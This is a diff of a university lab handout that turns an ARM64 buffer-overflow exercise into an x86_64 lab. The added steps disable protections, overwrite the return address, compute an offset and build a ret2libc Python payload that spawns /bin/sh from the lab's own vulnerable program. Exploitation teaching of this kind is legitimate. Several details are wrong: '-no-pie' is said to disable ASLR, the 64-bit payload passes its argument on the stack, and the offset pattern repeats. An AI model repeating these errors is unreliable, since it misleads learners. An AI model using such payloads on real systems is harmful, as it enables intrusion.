@@ -1,24 +1,22 @@
+# **🔥 Lab: Buffer Overflow & Exploiting Return Addresses in Linux (x86_64) 🔥**  
 
-# **Lab: Buffer Overflows & Debugging in Linux (ARM64)**
-### **Objective:**  
+## **🎯 Objective**
 1️⃣ **Run the program normally (no crash).**  
-2️⃣ **Cause a segmentation fault using buffer overflow.**  
-3️⃣ **Analyze the crash in GDB.**  
-4️⃣ **Understand how return addresses can be corrupted.**  
+2️⃣ **Cause a segmentation fault using a buffer overflow.**  
+3️⃣ **Analyze the crash in GDB (`rsp` and `rbp`).**  
+4️⃣ **Understand how return addresses are overwritten.**  
+5️⃣ **Exploit the overflow to spawn a shell (`/bin/sh`).**  
 
-Note, your professor worked with ChatGPT to make this lab work!
+👨‍🏫 **Note:** This lab was designed with your professor’s help and ChatGPT’s assistance! 😃🔥  
 
 ---
 
 ## **🛠 Step 1: Set Up the Vulnerable Program**
-### **Create the file (`overflow.c`)**
-
+### **1️⃣ Create the file (`overflow.c`)**
 ```bash
 nano overflow.c
 ```
-
-Paste this vulnerable C code:
-
+📌 **Paste this vulnerable C code:**  
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -38,174 +36,209 @@ int main(int argc, char *argv[]) {
     return 0;
 }
 ```
-
-Save the file!
+✅ **Save the file!** (`CTRL + X`, `Y`, `ENTER`)  
 
 ---
 
 ## **🛠 Step 2: Compile the Program (Disable Protections)**
-
 ```bash
-gcc -o overflow overflow.c -fno-stack-protector -z execstack -g
+gcc -o overflow overflow.c -fno-stack-protector -z execstack -no-pie -g
 ```
-
-### **What This Does:**
-- `-fno-stack-protector` → Disables stack canaries (stack protection).  
-- `-z execstack` → Allows execution on the stack.  
-- `-g` → Includes debug symbols for GDB analysis.  
+### **🔍 What These Flags Do**
+- `-fno-stack-protector` → **Disables stack canaries (stack protection).**  
+- `-z execstack` → **Allows execution on the stack.**  
+- `-no-pie` → **Disables ASLR (makes addresses predictable).**  
+- `-g` → **Includes debug symbols for GDB analysis.**  
 
 ---
 
 ## **🛠 Step 3: Run the Program Normally (No Crash)**
-Try with a normal input:
-
 ```bash
 ./overflow hello
 ```
-
 ✅ Expected output:
-
 ```
 You entered: hello
 ```
-
-✅ No crash! The buffer safely holds `"hello"`.
+✅ **No crash!** The buffer safely holds `"hello"`.  
 
 ---
 
 ## **🛠 Step 4: Cause a Segmentation Fault**
-
 Now, let's **overflow the buffer**:
 ```bash
 ./overflow AAAAAAAAAAAAAAAAAAAAA
 ```
-
 🔥 Expected output:
-
 ```
 Segmentation fault (core dumped)
 ```
-
 ✅ **Boom! We just crashed the program!**  
-This means we **overwrote something critical in memory**.
+This means we **overwrote something critical in memory** (likely the return address).  
 
 ---
 
-Absolutely! Here's the **updated GDB section**, explaining everything step by step.  
+# **🛠 Step 5: Debug the Crash in GDB (Using `rsp` and `rbp`)**
+Now that we **crashed the program**, let’s investigate using **GDB (GNU Debugger)**.  
 
----
-
-# **🛠 Step 5: Analyze the Crash in GDB**  
-Now that we **crashed the program**, let’s investigate what happened using **GDB (GNU Debugger)**.  
-
-## 🔍 **What Is GDB?**  
-GDB allows us to:  
-✅ **Run the program step by step** and pause execution.  
-✅ **Inspect registers, memory, and stack contents** in real time.  
-✅ **Identify crashes and find vulnerabilities.**  
-
----
-
-## **🛠 Step 6: Set a Breakpoint on the Vulnerable Function**  
-We first run GDB and pause execution **before the overflow happens**.  
-
-### **1️⃣ Start GDB on Our Program**
-Run:  
+### **1️⃣ Start GDB**
 ```bash
 gdb -q ./overflow
 ```
-🔹 `-q` starts GDB **without the banner clutter**.  
-
-### **2️⃣ Set a Breakpoint at `vulnerable_function`**  
-A **breakpoint** stops the program before a specific function executes.  
-In GDB, type:  
+📌 **Set a breakpoint at `vulnerable_function`:**  
 ```gdb
 break vulnerable_function
 ```
-You should see:  
-```
-Breakpoint 1 at 0xaaaaaaaa07d0: file overflow.c, line 5.
-```
-This means GDB will **pause execution when `vulnerable_function` starts**.
-
----
-
-## **🛠 Step 7: Run the Program with Normal Input**  
-Now, run the program with **safe input** (`hello`):  
+📌 **Run with normal input first (no crash):**  
 ```gdb
 run hello
 ```
 💥 The program **pauses** at `vulnerable_function`.  
 
-### **3️⃣ Check the Registers (Before Overflow)**
-At the breakpoint, check register values:  
+---
+
+### **2️⃣ Check the Stack Before Overflow**
+#### **Check Register Values**
 ```gdb
 info registers
 ```
-You should see:
-```
-x30 = 0xaaaaaaaa0858
-```
-✅ **`x30` (Link Register) is clean!** It holds the correct **return address** (`0xaaaaaaaa0858`), meaning no corruption has occurred.
+👀 Look at:  
+- **`rbp`** (Base Pointer) → This **stores the previous frame pointer**.  
+- **`rsp`** (Stack Pointer) → This **points to the top of the stack**.  
+- **`rip`** (Instruction Pointer) → This **stores the return address**.  
 
-### **4️⃣ Inspect the Stack (Before Overflow)**
-Let's look at **10 entries** in memory from the **stack pointer (`sp`)**:  
+#### **Check Stack Memory (`rsp`)**
 ```gdb
-x/10gx $sp
+x/20gx $rsp
 ```
-You’ll see normal stack values, including the **return address** in memory.  
-✅ The stack is **unchanged and safe** at this point.
+✅ You should see **normal stack values**, including the **return address** just above `rbp`.  
 
-Now, let’s **continue execution normally**:  
+📌 **Continue execution normally:**  
 ```gdb
 continue
 ```
-✅ The program prints `"You entered: hello"` and exits **without crashing**.
+✅ The program prints `"You entered: hello"` and exits **without crashing**.  
 
 ---
 
-# **🛠 Step 8: Run the Program with an Overflow (Crash Time!)**  
-Now, we trigger the **buffer overflow** and watch the destruction!  
-
+# **🛠 Step 6: Run the Overflow in GDB**
+Now, **run the program again, but with the overflow input**:
 ```gdb
 run AAAAAAAAAAAAAAAAAAAAA
 ```
 💥 **Boom! Segmentation fault!**  
-The program **crashes**, but GDB catches it.
+The program **crashes**, but GDB catches it.  
 
 ---
 
-# **🛠 Step 9: Inspect the Damage**  
-Now, let's see what changed!  
-
-### **1️⃣ Check Registers (Something’s Wrong!)**  
-Run:
+### **1️⃣ Check the Registers (Damage Report!)**
 ```gdb
 info registers
 ```
-🔍 Look at **`x30` (return address)**. It might now be:
+🔍 Look at **`rip`**:  
 ```
-x30 = 0x4141414141414141
+rip = 0x4141414141414141
 ```
-🔥 **`0x4141414141414141` is just "AAAAAAA..." in ASCII!**  
-✅ This means **our input overwrote the return address!** YIKES! 😲  
+🔥 **Our input ("AAAA...") overwrote `rip`!**  
+✅ **This confirms we control execution!**  
 
-### **2️⃣ Look at the Stack (Corruption Confirmed!)**  
-Now, inspect the stack memory again:
+### **2️⃣ Look at the Stack (Corruption Confirmed!)**
 ```gdb
-x/10gx $sp
+x/20gx $rsp
 ```
-🔍 You should **see our "AAAAAA..." input** written into the stack, replacing the old return address.
-
-✅ **We completely overwrote the return address with user-controlled input!**  
-**If we replace it with a valid function address, we can hijack execution!** 🚀
+👀 You should see **our "AAAAAAA..." input written into the stack**, replacing the old return address.  
 
 ---
 
-# 🎯 **Key Takeaways**
-✅ **Before the overflow**, `x30` (return address) is intact.  
-✅ **After the overflow**, `x30` is replaced with `"AAAA..."` (our input).  
-✅ **The stack memory shows our exploit in action.**  
-✅ **This is the foundation of many real-world exploits!**  
+## **🛠 Step 7: Find the Exact Offset**
+Now, let's determine **exactly how many bytes** it takes to overwrite `rip`.  
 
-🚀 Want to **redirect execution somewhere fun**? Let's hijack it to call `system("/bin/sh")` next! 😏🔥
+📌 **Generate a unique pattern:**  
+```bash
+python3 -c 'import string; print("".join(string.ascii_uppercase[:26] + string.ascii_lowercase[:26] + "0123456789")[:128])'
+```
+📌 **Run with this input:**  
+```bash
+./overflow ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+```
+💥 **It crashes again!**  
+
+📌 **Check `rip` in GDB:**  
+```gdb
+info registers
+```
+👀 Example output:  
+```
+rip = 0x6b6a696867666564
+```
+📌 **Convert it back to ASCII to find the offset:**  
+```bash
+python3 -c 'print(bytes.fromhex("6b6a696867666564")[::-1])'
+```
+🔥 **This tells us exactly how many bytes are needed before overwriting `rip`!**  
+
+---
+
+## **🛠 Step 8: Exploit It and Spawn a Shell**
+### **1️⃣ Find `system()` and `/bin/sh`**
+📌 **Find `system()` in GDB:**  
+```gdb
+p/x system
+```
+👀 Example output:
+```
+$1 = 0x7ffff7c50d70
+```
+📌 **Find `/bin/sh` manually:**  
+```bash
+strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+```
+👀 Example output:
+```
+1b45bd /bin/sh
+```
+📌 **Convert this to an actual memory address:**  
+```bash
+python3 -c 'print(hex(0x7ffff7c00000 + 0x1b45bd))'
+```
+👀 Example output:
+```
+0x7ffff7db45bd
+```
+✅ **Now we have `system()` and `/bin/sh` addresses!**  
+
+---
+
+### **2️⃣ Build the Final Exploit**
+📌 **Modify `construct_exploit.py`**
+```python
+import struct
+
+offset = <YOUR_EXACT_OFFSET>  # Adjust based on GDB findings
+system_addr = 0x7ffff7c50d70  # Replace with correct system() address
+binsh_addr = 0x7ffff7db45bd  # Replace with correct /bin/sh address
+ret_addr = 0x0000000000000000  # Placeholder return address
+
+payload = b"A" * offset         # Fill buffer up to `rip`
+payload += struct.pack("<Q", system_addr)  # Overwrite return address with system()
+payload += struct.pack("<Q", ret_addr)  # Fake return address (optional)
+payload += struct.pack("<Q", binsh_addr)  # Argument to system()
+
+print(payload.decode("latin1"))
+```
+
+📌 **Run the exploit:**  
+```bash
+./overflow "$(python3 construct_exploit.py)"
+```
+🔥 **BOOM! You should now have a shell!** 🚀  
+
+---
+
+# **🎯 Final Recap**
+✅ Found the buffer overflow using **GDB, `$rsp`, and `$rbp`**.  
+✅ Calculated the **exact offset to `rip`**.  
+✅ Overwrote `rip` with `system("/bin/sh")`.  
+✅ **Got a shell! 🎉**  
+
+🚀 **Try it and let me know if you need help!** 😃🔥
